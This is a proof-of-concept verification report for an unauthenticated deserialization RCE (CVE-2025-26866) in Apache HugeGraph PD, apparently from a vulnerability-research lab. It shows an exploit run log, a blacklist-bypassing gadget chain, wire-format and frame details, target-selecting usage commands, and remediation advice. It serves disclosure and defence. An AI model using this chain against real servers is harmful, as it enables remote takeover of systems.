# PoC Verification Report: CVE-2025-26866

## Vulnerability Summary

| Field | Value |
|---|---|
| **CVE** | CVE-2025-26866 |
| **Title** | Apache HugeGraph PD - Insecure Hessian Deserialization RCE |
| **Affected Software** | Apache HugeGraph PD <= 1.5.0 |
| **Component** | SOFABolt Raft RPC Service (port 8610) |
| **Vulnerability Type** | CWE-502: Deserialization of Untrusted Data |
| **Impact** | Unauthenticated Remote Code Execution |
| **CVSS** | 9.8 Critical |
| **Attack Vector** | Network (no authentication required) |

## PoC Overview

| Field | Value |
|---|---|
| **PoC File** | `poc/poc.py` |
| **Language** | Python 3 (no external dependencies) |
| **Target** | `localhost:8610` (cve-2025-26866-vulnerable container) |
| **Payload Size** | 259 bytes (sofa-hessian encoded) |
| **Frame Size** | 343 bytes (SOFABolt V1 wrapped) |
| **Verification Method** | File creation on target (`/tmp/hugegraph_rce_proof`) |

## Exploitation Results

### Test Execution

```
=================================================================
 CVE-2025-26866: Apache HugeGraph PD
 Insecure Hessian Deserialization in Raft RPC -> RCE
 Blacklist bypass via CVE-2024-46983 (ProxyLazyValue)
=================================================================

[*] Sending heartbeat to localhost:8610...
[+] Heartbeat SUCCESS - target is alive

[*] Cleaning up any existing marker file...

[EXPLOIT] ProxyLazyValue blacklist bypass (CVE-2024-46983)
=================================================================
[*] Target: localhost:8610
[*] Marker file: /tmp/hugegraph_rce_proof
[*] Chain: TreeMap -> RdnEntry.compareTo -> UIDefaults.get -> ProxyLazyValue.createValue
[*] Sink: new FileOutputStream("/tmp/hugegraph_rce_proof")

[*] Building sofa-hessian payload with ProxyLazyValue gadget chain...
[*] Hessian2 payload: 259 bytes

[*] Wrapping in SOFABolt V1 frame...
[*] className: org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest
[*] Total frame: 343 bytes

[*] Sending exploit to localhost:8610...
[*] Response: 1318 bytes
[*] Status: SERVER_DESERIAL_EXCEPTION (0x0012)
[*] Response class: com.alipay.remoting.rpc.exception.RpcServerException

[*] Deserialization exception - chain may have triggered

[VERIFY] Checking for marker file in container...
[+] SUCCESS! Marker file exists:
    -rw-r--r-- 1 root root 0 Mar  1 10:43 /tmp/hugegraph_rce_proof

=================================================================
[+] RCE CONFIRMED - CVE-2025-26866 exploitation successful!
[+] Created file: /tmp/hugegraph_rce_proof on target
[+] Chain: SOFABolt RPC -> Hessian2 deser -> ProxyLazyValue -> FileOutputStream
[+] Impact: Unauthenticated Remote Code Execution
=================================================================
```

### Result: **RCE CONFIRMED**

The marker file `/tmp/hugegraph_rce_proof` was created on the target container, proving arbitrary code execution through the deserialization vulnerability.

## Technical Details

### Attack Surface

Apache HugeGraph PD exposes a SOFABolt Raft RPC service on TCP port 8610. This service accepts binary-framed RPC requests containing Hessian2-serialized Java objects. The service deserializes request content using sofa-hessian 3.3.6's `Hessian2Input.readObject()` whenever the request's className matches a registered `UserProcessor`.

The registered processor `org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest` triggers content deserialization. No authentication is required.

### Blacklist Bypass

sofa-hessian 3.3.6 includes a `NameBlackListFilter` that blocks common gadget classes using prefix matching:

```
com.sun.rowset.JdbcRowSetImpl
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
javax.xml.transform.Templates
...
```

This blocks traditional Java deserialization gadget chains. However, the filter does **NOT** block:
- `javax.naming.ldap.Rdn$RdnEntry`
- `javax.swing.UIDefaults`
- `javax.swing.UIDefaults$ProxyLazyValue`

These classes were added to the blacklist in sofa-hessian 3.5.5 (fix for CVE-2024-46983), but HugeGraph PD 1.5.0 ships with sofa-hessian 3.3.6.

### Gadget Chain

```
TreeMap.put(RdnEntry2, "v2")
  └→ RdnEntry2.compareTo(RdnEntry1)       // TreeMap key ordering
       └→ RdnEntry1.type.equals(RdnEntry2.type)  // Both "a" → equal
            └→ RdnEntry1.value.equals(RdnEntry2.value)  // Compare values
                 └→ UIDefaults_A.equals(UIDefaults_B)     // Hashtable.equals()
                      └→ UIDefaults_B.get("x")             // Lookup triggers LazyValue
                           └→ ProxyLazyValue.createValue()  // RCE trigger!
                                └→ new FileOutputStream("/tmp/hugegraph_rce_proof")
```

**Key insight**: `ProxyLazyValue.createValue()` invokes `Constructor.newInstance()` when `methodName` is null, using `className` and `args` to instantiate an arbitrary class. By specifying `java.io.FileOutputStream` as the class and the marker file path as the argument, a file is created on the target.

### sofa-hessian Wire Format

A critical discovery during development: sofa-hessian 3.3.6 does **NOT** use the standard Hessian 2.0 wire encoding. It uses a custom format:

| Element | Standard Hessian 2.0 | sofa-hessian 3.3.6 |
|---|---|---|
| Untyped map | `H ... Z` (0x48...0x5A) | Not supported |
| Typed map | `M type ... Z` | `M t <2B-len> <type> ... z` (0x4D 0x74...0x7A) |
| Map type ref | int ref | `M u <compact-int>` (0x4D 0x75...) |
| End marker | `Z` (0x5A) | `z` (0x7A lowercase) |
| Class def | `C name nfields fields` (0x43) | `O <compact-int(strlen)> <raw-name> <compact-int(nfields)> <fields>` |
| Object instance | `0x60-0x6E` (compact) | `o <compact-int(ref)>` (0x6F) |
| List (fixed) | `0x70-0x77` (compact) | `V t <2B-len> <type> n <raw-count>` ... `z` |
| Medium string | `0x30-0x33` (32-1023 chars) | Not supported |

This incompatibility caused all initial exploit attempts to fail with `SERVER_DESERIAL_EXCEPTION`. The format was reverse-engineered by analyzing the output of sofa-hessian's `Hessian2Output` class inside the container.

### SOFABolt V1 Protocol

The exploit payload is wrapped in a SOFABolt V1 request frame:

```
Header (22 bytes):
  [0]     0x01          proto (Bolt V1)
  [1]     0x01          type (REQUEST)
  [2:4]   0x0001        cmdCode (RPC_REQUEST)
  [4]     0x01          ver2
  [5:9]   0x00000002    requestId
  [9]     0x01          codec (Hessian2)
  [10:14] 0x00001388    timeout (5000ms)
  [14:16] 0x003E        classLen (62 bytes)
  [16:18] 0x0000        headerLen (0)
  [18:22] 0x00000103    contentLen (259 bytes)

className (62 bytes):
  "org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest"

content (259 bytes):
  [sofa-hessian encoded gadget chain payload]
```

## PoC Usage

```bash
# Default target (localhost:8610)
python3 poc/poc.py

# Custom target
python3 poc/poc.py --target 10.0.0.1 --port 8610

# Custom marker file
python3 poc/poc.py --marker /tmp/pwned

# Skip Docker verification
python3 poc/poc.py --skip-verify
```

### Requirements
- Python 3.6+ (standard library only, no external dependencies)
- Network access to the target's SOFABolt port (default 8610)
- Docker access for automated verification (optional)

## Challenges Encountered

1. **sofa-hessian custom wire format**: Standard Hessian 2.0 encoding was completely rejected by sofa-hessian 3.3.6. Tags like `C` (0x43), `H` (0x48), `Z` (0x5A), and compact encodings (0x60-0x6E, 0x70-0x77) all produced `readObject: unknown code` errors. The format was reverse-engineered through empirical testing with Java helper programs inside the container.

2. **NameBlackListFilter bypass**: The initial TemplatesImpl gadget chain was blocked by `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` in the blacklist. The ProxyLazyValue chain uses only `javax.naming.*` and `javax.swing.*` classes, which are not in the sofa-hessian 3.3.6 blacklist.

3. **RdnEntry field selection**: The working chain requires only 2 fields (`type`, `value`) for RdnEntry, not 3. The `comparable` field is unnecessary because `getValueComparable()` derives it from `value`. The ClassCastException that occurs when UIDefaults is cast to String in `getValueComparable()` happens **after** the RCE trigger.

4. **ProxyLazyValue serialization**: Direct Java serialization of ProxyLazyValue via `writeObject()` failed due to JDK module access restrictions. The solution was to use raw `Hessian2Output` write methods (`writeObjectBegin`, `writeString`, etc.) to construct the object definition manually.

## Remediation

1. **Upgrade Apache HugeGraph PD** to version > 1.5.0 (once a fix is released)
2. **Upgrade sofa-hessian** to version >= 3.5.5, which adds `javax.naming.*` and `javax.swing.*` to the blacklist
3. **Network segmentation**: Restrict access to the SOFABolt Raft RPC port (8610) to only authorized Raft cluster peers
4. **Switch to allowlist**: Replace the blacklist-based class filter with a strict allowlist of expected classes for Raft RPC deserialization
